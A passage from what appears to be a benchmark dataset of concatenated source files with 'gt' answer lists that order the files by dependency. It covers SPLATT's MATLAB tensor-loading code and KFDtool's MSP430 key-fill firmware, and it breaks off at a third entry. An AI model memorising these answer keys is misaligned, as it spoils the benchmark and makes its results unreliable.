sizeof(uint64_t));\n}\n\n\n\nstatic void p_mk_double(\n    mxArray * const mxstruct,\n    char const * const field,\n    splatt_idx_t const len,\n    splatt_val_t const * const vals)\n{\n  mxSetField(mxstruct, 0, field,\n      mxCreateDoubleMatrix(1, len, mxREAL));\n  memcpy(p_get_uint64_data(mxstruct, field), vals, len * sizeof(double));\n}\n\n\ntypedef struct splatt_option\n{\n  char * name;\n  int has_arg;\n  int opt_id;\n} splattlab_option_t;\n\nstatic splattlab_option_t option_names[] =\n{\n  {\"tol\", 1, SPLATT_OPTION_TOLERANCE},\n  {\"its\", 1, SPLATT_OPTION_NITER},\n  {\"threads\", 1, SPLATT_OPTION_NTHREADS},\n  {\"verbosity\", 1, SPLATT_OPTION_VERBOSITY},\n  {NULL, 0, 0}\n};\n\n\nstatic void p_parse_opts(\n    mxArray const * const opts,\n    double * const cpd_opts)\n{\n  if(!mxIsStruct(opts)) {\n    mexErrMsgTxt(\"SPLATT expects options array to be a structure.\\n\");\n    return;\n  }\n\n  splattlab_option_t * head = option_names;\n  for(; head->name != NULL; ++head) {\n    mxArray * mopt = mxGetField(opts, 0, head->name);\n    if(!mopt) {\n      continue;\n    }\n\n    if(head->has_arg == 1) {\n      cpd_opts[head->opt_id] = (double) mxGetScalar(mopt);\n    } else {\n      cpd_opts[head->opt_id] = 1;\n    }\n  }\n}\n\n\n\n\n\n\nstatic splatt_csf * p_convert_sptensor(\n    mxArray const * const mat_inds,\n    mxArray const * const mat_vals,\n    splatt_idx_t * const nmodes,\n    double const * const cpd_opts)\n{\n  splatt_idx_t m;\n\n\n  mwSize const * dims = mxGetDimensions(mat_inds);\n  splatt_idx_t nnz = dims[0];\n  *nmodes = dims[1];\n\n\n  splatt_val_t * vals = (splatt_val_t *) mxMalloc(nnz * sizeof(splatt_val_t));\n  splatt_idx_t * inds[SPLATT_MAX_NMODES];\n  for(m=0; m < *nmodes; ++m) {\n    inds[m] = (splatt_idx_t *) mxMalloc(nnz * sizeof(splatt_idx_t));\n  }\n\n\n  double const * const mxinds = mxGetPr(mat_inds);\n  double const * const mxvals = mxGetPr(mat_vals);\n\n\n  splatt_idx_t n;\n  for(n=0; n < nnz; ++n) {\n    for(m=0; m < *nmodes; ++m) {\n      inds[m][n] = (splatt_idx_t) mxinds[n + (m*nnz)] - 1;\n    }\n    vals[n] = (splatt_val_t) mxvals[n];\n  }\n\n  splatt_csf * tt;\n  splatt_csf_convert(*nmodes, nnz, inds, vals, &tt, cpd_opts);\n\n  for(m=0; m < *nmodes; ++m) {\n    mxFree(inds[m]);\n  }\n  mxFree(vals);\n\n  return tt;\n}\n\n\n\nstatic splatt_csf * p_unpack_csf_cell(\n    mxArray const * const cell,\n    splatt_idx_t * outnmodes)\n{\n  splatt_idx_t t, i, tile;\n  splatt_csf * csf = NULL;\n  splatt_idx_t ntensors = (splatt_idx_t) mxGetNumberOfElements(cell);\n\n  csf = (splatt_csf *) mxMalloc(ntensors * sizeof(*csf));\n\n  for(t=0; t < ntensors; ++t) {\n    mxArray const * const curr = mxGetCell(cell, t);\n\n    csf[t].nnz = *(p_get_uint64_data(curr, \"nnz\"));\n    csf[t].nmodes = *(p_get_uint64_data(curr, \"nmodes\"));\n\n    splatt_idx_t const nmodes = csf[t].nmodes;\n\n    memcpy(csf[t].dims, p_get_uint64_data(curr, \"dims\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(csf[t].dim_perm, p_get_uint64_data(curr, \"dim_perm\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(csf[t].dim_iperm, p_get_uint64_data(curr, \"dim_iperm\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(&(csf[t].which_tile), p_get_int_data(curr, \"which_tile\"),\n        sizeof(splatt_tile_type));\n    memcpy(&(csf[t].ntiles), p_get_uint64_data(curr, \"ntiles\"),\n        sizeof(uint64_t));\n    memcpy(&(csf[t].ntiled_modes), p_get_uint64_data(curr, \"ntiled_modes\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(csf[t].tile_dims, p_get_uint64_data(curr, \"tile_dims\"),\n        nmodes * sizeof(uint64_t));\n\n\n    csf[t].pt = (csf_sparsity *)mxMalloc(csf[t].ntiles * sizeof(csf_sparsity));\n\n\n    mxArray const * const pts = mxGetField(curr, 0, \"pt\");\n    for(tile=0; tile < csf[t].ntiles; ++tile) {\n      csf_sparsity * pt = csf[t].pt + tile;\n      mxArray const * const curr_tile = mxGetCell(pts, tile);\n\n      memcpy(pt->nfibs, p_get_uint64_data(curr_tile, \"nfibs\"),\n          nmodes * sizeof(uint64_t));\n\n      if(pt->nfibs[nmodes-1] == 0) {\n        pt->vals = NULL;\n\n        splatt_idx_t m;\n        for(m=0; m < nmodes; ++m) {\n          pt->fptr[m] = NULL;\n          pt->fids[m] = NULL;\n        }\n\n        pt->fptr[0] = (splatt_idx_t *) malloc(2 * sizeof(**(pt->fptr)));\n        pt->fptr[0][0] = 0;\n        pt->fptr[0][1] = 0;\n\n        continue;\n      }\n\n      pt->vals = p_get_double_data(curr_tile, \"vals\");\n\n\n      int32_t has_fids[SPLATT_MAX_NMODES];\n      memcpy(has_fids, mxGetData(mxGetField(curr_tile, 0, \"has_fids\")),\n          nmodes * sizeof(int32_t));\n\n\n      mxArray const * const mxfptr = mxGetField(curr_tile, 0, \"fptr\");\n      splatt_idx_t m;\n      for(m=0; m < nmodes-1; ++m) {\n        pt->fptr[m] = mxGetData(mxGetCell(mxfptr, m));\n      }\n\n      mxArray const * const mxfids = mxGetField(curr_tile, 0, \"fids\");\n      for(m=0; m < nmodes; ++m) {\n        if(has_fids[m]) {\n          pt->fids[m] = mxGetData(mxGetCell(mxfids, m));\n        } else {\n          pt->fids[m] = NULL;\n        }\n      }\n    }\n  }\n\n  *outnmodes = csf->nmodes;\n  return csf;\n}\n\n\n\nstatic splatt_csf * p_parse_tensor(\n    int const nargs,\n    mxArray const * const args[],\n    splatt_idx_t * nmodes,\n    double const * const cpd_opts)\n{\n  splatt_csf * tt = NULL;\n  if(nargs < 1) {\n    mexErrMsgTxt(\"Missing arguments. See 'help splatt_load' for usage.\\n\");\n    return NULL;\n  }\n\n  if(mxIsChar(args[0])) {\n    char * fname = (char *) mxArrayToString(args[0]);\n    int err = splatt_csf_load(fname, nmodes, &tt, cpd_opts);\n\n    if(err != SPLATT_SUCCESS) {\n      mexErrMsgIdAndTxt(\"SPLATT:FileNotFound\",\n                        \"Could not load file '%s'.\\n\", fname);\n    }\n    mxFree(fname);\n  } else if(nargs > 1 && mxIsNumeric(args[0]) && mxIsNumeric(args[1])) {\n    tt = p_convert_sptensor(args[0], args[1], nmodes, cpd_opts);\n  } else if(mxIsCell(args[0])) {\n    tt = p_unpack_csf_cell(args[0], nmodes);\n  } else {\n    mexErrMsgTxt(\"Invalid tensor format. See 'help splatt_load' for usage.\\n\");\n    return NULL;\n  }\n\n  return tt;\n}\n\n\n\nstatic void p_free_tensor(\n    int const nargs,\n    mxArray const * const args[],\n    splatt_csf * tt,\n    double const * const splatt_opts)\n{\n  if(mxIsChar(args[0])) {\n    splatt_free_csf(tt, splatt_opts);\n  } else if(nargs > 1 && mxIsNumeric(args[0]) && mxIsNumeric(args[1])) {\n    splatt_free_csf(tt, splatt_opts);\n  } else if(mxIsCell(args[0])) {\n\n  } else {\n    mexErrMsgTxt(\"Invalid tensor format. See 'help splatt_load' for usage.\\n\");\n  }\n}\n\n\n#endif\n\n'splatt/include/splatt/api_options.h'\n:\n\n\n\n#ifndef SPLATT_SPLATT_OPTION_H\n#define SPLATT_SPLATT_OPTION_H\n\n\n\n\n\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n\ndouble * splatt_default_opts(void);\n\n\n\nvoid  splatt_free_opts(\n    double * opts);\n\n\n\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'splatt/matlab/splatt_load.c'\n:\n#include \"mex.h\"\n\n#include <stdint.h>\n#include <string.h>\n#include <splatt.h>\n\n#include \"splatt_shared.h\"\n\n\nstatic char const * csf_keys[] = {\n  \"nnz\",\n  \"nmodes\",\n  \"dims\",\n  \"dim_perm\",\n  \"dim_iperm\",\n  \"which_tile\",\n  \"ntiles\",\n  \"ntiled_modes\",\n  \"tile_dims\",\n  \"pt\"\n};\n\n\nstatic char const * sparsity_keys[] = {\n  \"nfibs\",\n  \"fptr\",\n  \"has_fids\",\n  \"fids\",\n  \"vals\"\n};\n\n\nstatic mxArray * p_pack_csf(\n    splatt_csf const * const tt,\n    double const * const splatt_opts)\n{\n  splatt_idx_t const nmodes = tt->nmodes;\n  splatt_idx_t ntensors;\n  splatt_csf_type which = splatt_opts[SPLATT_OPTION_CSF_ALLOC];\n  switch(which) {\n  case SPLATT_CSF_ONEMODE:\n    ntensors = 1;\n    break;\n  case SPLATT_CSF_TWOMODE:\n    ntensors = 2;\n    break;\n  case SPLATT_CSF_ALLMODE:\n    ntensors = nmodes;\n    break;\n  }\n\n\n  mxArray * csf = mxCreateCellMatrix(1, (mwSize) ntensors);\n\n  splatt_idx_t t;\n  for(t=0; t < ntensors; ++t) {\n    uint64_t * data;\n    mxArray * curr = mxCreateStructMatrix(1, 1,\n        sizeof(csf_keys)/sizeof(csf_keys[0]), csf_keys);\n\n\n    p_mk_uint64(curr, \"nnz\", 1, &(tt[t].nnz));\n    p_mk_uint64(curr, \"nmodes\", 1, &(nmodes));\n    p_mk_uint64(curr, \"dims\", nmodes, tt[t].dims);\n    p_mk_uint64(curr, \"dim_perm\", nmodes, tt[t].dim_perm);\n    p_mk_uint64(curr, \"dim_iperm\", nmodes, tt[t].dim_iperm);\n\n\n\n    int32_t which = tt[t].which_tile;\n    p_mk_int32(curr, \"which_tile\", 1, &(which));\n    p_mk_uint64(curr, \"ntiles\", 1, &(tt[t].ntiles));\n    p_mk_uint64(curr, \"ntiled_modes\", 1, &(tt[t].ntiled_modes));\n    p_mk_uint64(curr, \"tile_dims\", 1, tt[t].tile_dims);\n\n\n    mxArray * sparsities = mxCreateCellMatrix(1, (mwSize) tt[t].ntiles);\n\n    splatt_idx_t tile;\n    for(tile=0; tile < tt[t].ntiles; ++tile) {\n      mxArray * curr_tile = mxCreateStructMatrix(1, 1,\n          sizeof(sparsity_keys)/sizeof(sparsity_keys[0]), sparsity_keys);\n\n      csf_sparsity const * const pt = &(tt[t].pt[tile]);\n\n      p_mk_uint64(curr_tile, \"nfibs\", nmodes, pt->nfibs);\n      if(pt->nfibs[0] == 0) {\n        mxSetCell(sparsities, tile, curr_tile);\n        continue;\n      }\n\n      if(pt->nfibs[nmodes-1] > 0) {\n        p_mk_double(curr_tile, \"vals\", pt->nfibs[nmodes-1], pt->vals);\n      }\n\n\n      mxArray * mxfptrs = mxCreateCellMatrix(1, (mwSize) nmodes-1);\n      splatt_idx_t m;\n      for(m=0; m < nmodes-1; ++m) {\n        mxArray * fp = mxCreateNumericMatrix(1, pt->nfibs[m]+1, mxUINT64_CLASS, mxREAL);\n        memcpy(mxGetData(fp), pt->fptr[m], (1 + pt->nfibs[m]) * sizeof(uint64_t));\n        mxSetCell(mxfptrs, m, fp);\n      }\n\n      mxSetField(curr_tile, 0, \"fptr\", mxfptrs);\n\n\n      mxArray * mxfids = mxCreateCellMatrix(1, (mwSize) nmodes);\n\n      mxArray * has_fids = mxCreateNumericMatrix(1, nmodes, mxINT32_CLASS,\n          mxREAL);\n      int32_t has[SPLATT_MAX_NMODES];\n\n      for(m=0; m < nmodes; ++m) {\n        has[m] = (pt->fids[m] != NULL);\n\n        if(pt->fids[m] != NULL) {\n          mxArray * fi = mxCreateNumericMatrix(1, pt->nfibs[m], mxUINT64_CLASS, mxREAL);\n          memcpy(mxGetData(fi), pt->fids[m], pt->nfibs[m] * sizeof(uint64_t));\n          mxSetCell(mxfids, m, fi);\n        }\n      }\n      mxSetField(curr_tile, 0, \"fids\", mxfids);\n\n      memcpy(mxGetData(has_fids), has, nmodes * sizeof(int32_t));\n      mxSetField(curr_tile, 0, \"has_fids\", has_fids);\n\n\n      mxSetCell(sparsities, tile, curr_tile);\n    }\n\n    mxSetField(curr, 0, \"pt\", sparsities);\n\n\n    mxSetCell(csf, t, curr);\n  }\n\n  return csf;\n}\n\n\nvoid mexFunction(\n    int nlhs,\n    mxArray * plhs[],\n    int nrhs,\n    mxArray const * prhs[])\n{\n  if(nrhs == 0) {\n    mexErrMsgTxt(\"ARG1 must be a file or sptensor\\n\");\n  }\n\n  double * cpd_opts = splatt_default_opts();\n\n  splatt_idx_t nmodes;\n  splatt_csf * tt = p_parse_tensor(nrhs, prhs, &nmodes, cpd_opts);\n  if(tt == NULL) {\n    splatt_free_opts(cpd_opts);\n    return;\n  }\n\n  mxArray * csf = p_pack_csf(tt, cpd_opts);\n\n  p_free_tensor(nrhs, prhs, tt, cpd_opts);\n\n  splatt_free_opts(cpd_opts);\n  if(nlhs > 0) {\n    plhs[0] = csf;\n  }\n}\n\n",
        "gt": [
            "'splatt/include/splatt/api_options.h'",
            "'splatt/include/splatt.h'",
            "'splatt/matlab/splatt_shared.h'",
            "'splatt/matlab/splatt_load.c'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/TwiProtocol.c'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ram.h'"
        ],
        "content": "'KFDtool/fw/KFDtool/TwiProtocol.c'\n:\n\n\n\n\n\n#include \"msp430.h\"\n\n#include \"driverlib.h\"\n\n#include \"hal.h\"\n\n\n\n#include \"TwiProtocol.h\"\n\n\n\n#define BIT_TIME FCPU/4000\n\n#define HALF_BIT_TIME BIT_TIME/2\n\n#define SIG_TIME BIT_TIME*4\n\n\n\n#define ENABLE_KFD_RX_INT GPIO_clearInterrupt(GPIO_PORT_P1, GPIO_PIN3); GPIO_enableInterrupt(GPIO_PORT_P1, GPIO_PIN3);\n\n#define DISABLE_KFD_RX_INT GPIO_disableInterrupt(GPIO_PORT_P1, GPIO_PIN3);\n\n\n\n#define KFD_RX_IS_BUSY GPIO_getInputPinValue(GPIO_PORT_P1, GPIO_PIN3) == GPIO_INPUT_PIN_LOW\n\n#define KFD_RX_IS_IDLE GPIO_getInputPinValue(GPIO_PORT_P1, GPIO_PIN3) == GPIO_INPUT_PIN_HIGH\n\n\n\n#define SEN_RX_IS_CONN GPIO_getInputPinValue(GPIO_PORT_P2, GPIO_PIN5) == GPIO_INPUT_PIN_LOW\n\n#define SEN_RX_IS_DISC GPIO_getInputPinValue(GPIO_PORT_P2, GPIO_PIN5) == GPIO_INPUT_PIN_HIGH\n\n\n\nuint16_t busySending;\n\nuint16_t timerType;\n\nuint16_t rxBitsLeft;\n\nuint16_t txNumLeft;\n\nuint16_t bitCount;\n\nuint16_t TXByte;\n\nuint16_t RXByte;\n\nuint16_t hasReceived;\n\n\n\nuint8_t reverseByte(uint8_t b)\n\n{\n\n    const uint8_t table[] = {\n\n        0x00, 0x80, 0x40, 0xC0, 0x20, 0xA0, 0x60, 0xE0,\n\n        0x10, 0x90, 0x50, 0xD0, 0x30, 0xB0, 0x70, 0xF0,\n\n        0x08, 0x88, 0x48, 0xC8, 0x28, 0xA8, 0x68, 0xE8,\n\n        0x18, 0x98, 0x58, 0xD8, 0x38, 0xB8, 0x78, 0xF8,\n\n        0x04, 0x84, 0x44, 0xC4, 0x24, 0xA4, 0x64, 0xE4,\n\n        0x14, 0x94, 0x54, 0xD4, 0x34, 0xB4, 0x74, 0xF4,\n\n        0x0C, 0x8C, 0x4C, 0xCC, 0x2C, 0xAC, 0x6C, 0xEC,\n\n        0x1C, 0x9C, 0x5C, 0xDC, 0x3C, 0xBC, 0x7C, 0xFC,\n\n        0x02, 0x82, 0x42, 0xC2, 0x22, 0xA2, 0x62, 0xE2,\n\n        0x12, 0x92, 0x52, 0xD2, 0x32, 0xB2, 0x72, 0xF2,\n\n        0x0A, 0x8A, 0x4A, 0xCA, 0x2A, 0xAA, 0x6A, 0xEA,\n\n        0x1A, 0x9A, 0x5A, 0xDA, 0x3A, 0xBA, 0x7A, 0xFA,\n\n        0x06, 0x86, 0x46, 0xC6, 0x26, 0xA6, 0x66, 0xE6,\n\n        0x16, 0x96, 0x56, 0xD6, 0x36, 0xB6, 0x76, 0xF6,\n\n        0x0E, 0x8E, 0x4E, 0xCE, 0x2E, 0xAE, 0x6E, 0xEE,\n\n        0x1E, 0x9E, 0x5E, 0xDE, 0x3E, 0xBE, 0x7E, 0xFE,\n\n        0x01, 0x81, 0x41, 0xC1, 0x21, 0xA1, 0x61, 0xE1,\n\n        0x11, 0x91, 0x51, 0xD1, 0x31, 0xB1, 0x71, 0xF1,\n\n        0x09, 0x89, 0x49, 0xC9, 0x29, 0xA9, 0x69, 0xE9,\n\n        0x19, 0x99, 0x59, 0xD9, 0x39, 0xB9, 0x79, 0xF9,\n\n        0x05, 0x85, 0x45, 0xC5, 0x25, 0xA5, 0x65, 0xE5,\n\n        0x15, 0x95, 0x55, 0xD5, 0x35, 0xB5, 0x75, 0xF5,\n\n        0x0D, 0x8D, 0x4D, 0xCD, 0x2D, 0xAD, 0x6D, 0xED,\n\n        0x1D, 0x9D, 0x5D, 0xDD, 0x3D, 0xBD, 0x7D, 0xFD,\n\n        0x03, 0x83, 0x43, 0xC3, 0x23, 0xA3, 0x63, 0xE3,\n\n        0x13, 0x93, 0x53, 0xD3, 0x33, 0xB3, 0x73, 0xF3,\n\n        0x0B, 0x8B, 0x4B, 0xCB, 0x2B, 0xAB, 0x6B, 0xEB,\n\n        0x1B, 0x9B, 0x5B, 0xDB, 0x3B, 0xBB, 0x7B, 0xFB,\n\n        0x07, 0x87, 0x47, 0xC7, 0x27, 0xA7, 0x67, 0xE7,\n\n        0x17, 0x97, 0x57, 0xD7, 0x37, 0xB7, 0x77, 0xF7,\n\n        0x0F, 0x8F, 0x4F, 0xCF, 0x2F, 0xAF, 0x6F, 0xEF,\n\n        0x1F, 0x9F, 0x5F, 0xDF, 0x3F, 0xBF, 0x7F, 0xFF\n\n    };\n\n\n\n    return table[b];\n\n}\n\n\n\n\n\n\n\nuint16_t isEvenParity(uint16_t inByte)\n\n{\n\n    uint16_t numOnes = 0;\n\n\n\n    uint16_t i;\n\n\n\n    for (i = 0; i < 8; i++)\n\n    {\n\n        if (inByte & 0x01)\n\n        {\n\n            numOnes++;\n\n        }\n\n\n\n        inByte = inByte >> 1;\n\n    }\n\n\n\n    if (numOnes % 2)\n\n    {\n\n        return 0;\n\n    }\n\n    else\n\n    {\n\n        return 1;\n\n    }\n\n}\n\n\n\nvoid twiInit(void)\n\n{\n\n    halGpio1Low();\n\n    ENABLE_KFD_RX_INT\n\n    halSenTxConn();\n\n}\n\n\n\nuint8_t twiSelfTest(void)\n\n{\n\n    uint16_t error = 0;\n\n    uint8_t result = 0x00;\n\n\n\n\n\n    DISABLE_KFD_RX_INT\n\n    halGpio1High();\n\n\n\n\n\n\n\n    if (!error)\n\n    {\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n        halDelayMs(10);\n\n\n\n        if (KFD_RX_IS_BUSY)\n\n        {\n\n            error = 1;\n\n            result = 0x01;\n\n        }\n\n\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n    }\n\n\n\n\n\n\n\n    if (!error)\n\n    {\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n        halDelayMs(10);\n\n\n\n        if (SEN_RX_IS_CONN)\n\n        {\n\n            error = 1;\n\n            result = 0x02;\n\n        }\n\n\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n    }\n\n\n\n\n\n\n\n    if (!error)\n\n    {\n\n        halKfdTxBusy();\n\n        halSenTxDisc();\n\n        halDelayMs(10);\n\n\n\n        if (KFD_RX_IS_IDLE)\n\n        {\n\n            error = 1;\n\n            result = 0x03;\n\n        }\n\n\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n    }\n\n\n\n\n\n\n\n    if (!error)\n\n    {\n\n        halKfdTxIdle();\n\n        halSenTxConn();\n\n        halDelayMs(10);\n\n\n\n        if (SEN_RX_IS_DISC)\n\n        {\n\n            error = 1;\n\n            result = 0x04;\n\n        }\n\n\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n    }\n\n\n\n\n\n\n\n\n\n\n\n\n\n    if (!error)\n\n    {\n\n        halKfdTxBusy();\n\n        halSenTxDisc();\n\n        halDelayMs(10);\n\n\n\n        if (SEN_RX_IS_CONN)\n\n        {\n\n            error = 1;\n\n            result = 0x05;\n\n        }\n\n\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n    }\n\n\n\n\n\n\n\n    if (!error)\n\n    {\n\n        halKfdTxIdle();\n\n        halSenTxConn();\n\n        halDelayMs(10);\n\n\n\n        if (KFD_RX_IS_BUSY)\n\n        {\n\n            error = 1;\n\n            result = 0x06;\n\n        }\n\n\n\n        halKfdTxIdle();\n\n        halSenTxDisc();\n\n    }\n\n\n\n\n\n    halKfdTxIdle();\n\n    halGpio1Low();\n\n    ENABLE_KFD_RX_INT\n\n    halSenTxConn();\n\n\n\n    return result;\n\n}\n\n\n\nuint16_t twiReceiveByte(uint8_t *c)\n\n{\n\n    if (hasReceived == 0)\n\n    {\n\n        return 0;\n\n    }\n\n\n\n    *c = reverseByte(RXByte);\n\n    hasReceived = 0;\n\n\n\n    return 1;\n\n}\n\n\n\nvoid twiSendKeySig(void)\n\n{\n\n    DISABLE_KFD_RX_INT\n\n    halGpio1High();\n\n\n\n    busySending = 1;\n\n    timerType = 1;\n\n    txNumLeft = 105;\n\n\n\n    Timer_A_setCompareValue(TIMER_A0_BASE, TIMER_A_CAPTURECOMPARE_REGISTER_0, SIG_TIME);\n\n    TA0CCTL0 |= CCIE;\n\n    TA0CTL |= TASSEL_2 + MC_1 + TACLR;\n\n\n\n    while (busySending);\n\n\n\n    halGpio1Low();\n\n    ENABLE_KFD_RX_INT\n\n}\n\n\n\nvoid twiSendPhyByte(uint8_t byteToSend)\n\n{\n\n    DISABLE_KFD_RX_INT\n\n    halGpio1High();\n\n\n\n    busySending = 1;\n\n    timerType = 2;\n\n    txNumLeft = 4;\n\n\n\n    TXByte = reverseByte(byteToSend);\n\n\n\n    if (isEvenParity(byteToSend) == 0)\n\n    {\n\n        TXByte |= 0x100;\n\n    }\n\n\n\n    TXByte = TXByte << 1;\n\n    bitCount = 10;\n\n\n\n    Timer_A_setCompareValue(TIMER_A0_BASE, TIMER_A_CAPTURECOMPARE_REGISTER_0, BIT_TIME);\n\n    TA0CCTL0 |= CCIE;\n\n    TA0CTL |= TASSEL_2 + MC_1 + TACLR;\n\n\n\n    while (busySending);\n\n\n\n    halGpio1Low();\n\n    ENABLE_KFD_RX_INT\n\n}\n\n\n\n#pragma vector=PORT1_VECTOR\n\n__interrupt void Port_1(void)\n\n{\n\n    DISABLE_KFD_RX_INT\n\n    halGpio1High();\n\n\n\n    timerType = 0;\n\n    rxBitsLeft = 10;\n\n    RXByte = 0;\n\n\n\n    Timer_A_setCompareValue(TIMER_A0_BASE, TIMER_A_CAPTURECOMPARE_REGISTER_0, HALF_BIT_TIME);\n\n    TA0CCTL0 |= CCIE;\n\n    TA0CTL |= TASSEL_2 + MC_1 + TACLR;\n\n}\n\n\n\n#pragma vector=TIMER0_A0_VECTOR\n\n__interrupt void TIMER0_A0_ISR(void)\n\n{\n\n    if (timerType == 0)\n\n    {\n\n        Timer_A_setCompareValue(TIMER_A0_BASE, TIMER_A_CAPTURECOMPARE_REGISTER_0, BIT_TIME);\n\n\n\n        if (rxBitsLeft == 0)\n\n        {\n\n            TA0CCTL0 &= ~CCIE;\n\n            Timer_A_stop(TIMER_A0_BASE);\n\n            while (KFD_RX_IS_BUSY);\n\n            halGpio1Low();\n\n            ENABLE_KFD_RX_INT\n\n            RXByte = RXByte >> 1;\n\n            RXByte &= 0xFF;\n\n\n\n            hasReceived = 1;\n\n        }\n\n        else\n\n        {\n\n            halGpio2Toggle();\n\n\n\n            if (KFD_RX_IS_IDLE)\n\n            {\n\n                RXByte |= 0x400;\n\n            }\n\n\n\n            RXByte = RXByte >> 1;\n\n            rxBitsLeft--;\n\n        }\n\n    }\n\n    else if (timerType == 1)\n\n    {\n\n        if (txNumLeft == 0)\n\n        {\n\n            TA0CCTL0 &= ~CCIE;\n\n            Timer_A_stop(TIMER_A0_BASE);\n\n            halKfdTxIdle();\n\n            busySending = 0;\n\n        }\n\n        else\n\n        {\n\n            if (txNumLeft > 5)\n\n            {\n\n                halKfdTxBusy();\n\n            }\n\n            else if (txNumLeft <= 5)\n\n            {\n\n                halKfdTxIdle();\n\n            }\n\n\n\n            txNumLeft--;\n\n        }\n\n    }\n\n    else if (timerType == 2)\n\n    {\n\n        if (bitCount == 0)\n\n        {\n\n            halKfdTxBusy();\n\n\n\n            if (txNumLeft == 0)\n\n            {\n\n                TA0CCTL0 &= ~CCIE;\n\n                Timer_A_stop(TIMER_A0_BASE);\n\n                halKfdTxIdle();\n\n                busySending = 0;\n\n            }\n\n            else\n\n            {\n\n                txNumLeft--;\n\n            }\n\n        }\n\n        else\n\n        {\n\n            if (TXByte & 0x01)\n\n            {\n\n                halKfdTxIdle();\n\n            }\n\n            else\n\n            {\n\n                halKfdTxBusy();\n\n            }\n\n\n\n            TXByte = TXByte >> 1;\n\n            bitCount--;\n\n        }\n\n    }\n\n}\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'\n:\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#include \"sysctl.h\"\n\n#include \"dma.h\"\n\n#include \"eusci_b_i2c.h\"\n\n#include \"rtc_b.h\"\n\n#include \"crc.h\"\n\n#include \"usci_a_uart.h\"\n\n#include \"flashctl.h\"\n\n#include \"ram.h\"\n\n#include \"dac12_a.h\"\n\n#include \"pmap.h\"\n\n#include \"mpy32.h\"\n\n#include \"rtc_a.h\"\n\n#include \"ucs.h\"\n\n#include \"aes.h\"\n\n#include \"tec.h\"\n\n#include \"usci_a_spi.h\"\n\n#include \"sfr.h\"\n\n#include \"wdt_a.h\"\n\n#include \"timer_a.h\"\n\n#include \"oa.h\"\n\n#include \"pmm.h\"\n\n#include \"lcd_b.h\"\n\n#include \"rtc_c.h\"\n\n#include \"adc10_a.h\"\n\n#include \"eusci_a_uart.h\"\n\n#include \"ctsd16.h\"\n\n#include \"usci_b_spi.h\"\n\n#include \"comp_b.h\"\n\n#include \"gpio.h\"\n\n#include \"tlv.h\"\n\n#include \"ldopwr.h\"\n\n#include \"adc12_a.h\"\n\n#include \"ref.h\"\n\n#include \"eusci_a_spi.h\"\n\n#include \"timer_b.h\"\n\n#include \"battbak.h\"\n\n#include \"usci_b_i2c.h\"\n\n#include \"eusci_b_spi.h\"\n\n#include \"timer_d.h\"\n\n#include \"lcd_c.h\"\n\n#include \"sd24_b.h\"\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ram.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_RAM_H__\n\n#define __MSP430WARE_RAM_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_RC__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define RAM_SECTOR0                                                    RCRS0OFF\n\n#define RAM_SECTOR1                                                    RCRS1OFF\n\n#define RAM_SECTOR2                                                    RCRS2OFF\n\n#define RAM_SECTOR3                                                    RCRS3OFF\n\n#define RAM_SECTOR4                                                    RCRS4OFF\n\n#define RAM_SECTOR5                                                    RCRS5OFF\n\n#define RAM_SECTOR6                                                    RCRS6OFF\n\n#define RAM_SECTOR7                                                    RCRS7OFF\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void RAM_setSectorOff(uint8_t sector);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t RAM_getSectorState(uint8_t sector);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ram.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/TwiProtocol.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/KeymasterClient.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/libavb.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_crypto.h'"
        ],
